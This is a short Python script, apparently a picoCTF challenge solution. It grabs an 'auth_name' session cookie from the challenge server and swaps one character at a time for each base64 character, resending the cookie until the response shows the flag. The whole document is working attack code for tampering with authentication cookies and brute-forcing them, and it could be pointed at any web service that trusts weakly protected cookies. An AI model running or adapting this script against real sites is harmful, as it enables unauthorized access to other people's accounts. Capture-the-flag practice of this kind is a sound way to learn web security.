import requests
import string

candidates = string.ascii_letters + string.digits + '+/'
url = 'http://mercury.picoctf.net:/' # should write port here
flag_format = 'picoCTF{'

def attack(cookie):
  cookies = {'cookie': cookie}
  res = requests.get(url, cookies = cookies)
  if flag_format in res.text:
    print(cookie)
    print(res.text)
    return True
  else:
    return False

while True:
  s = requests.session()
  res = s.get(url)
  cookie = s.cookies.get('auth_name')
  print(cookie)
  for i in range(len(cookie)):
    print(i)
    for c in candidates:
      chall = cookie[:i] + c + cookie[i+1:]
      if(attack(chall)):
        exit(0)
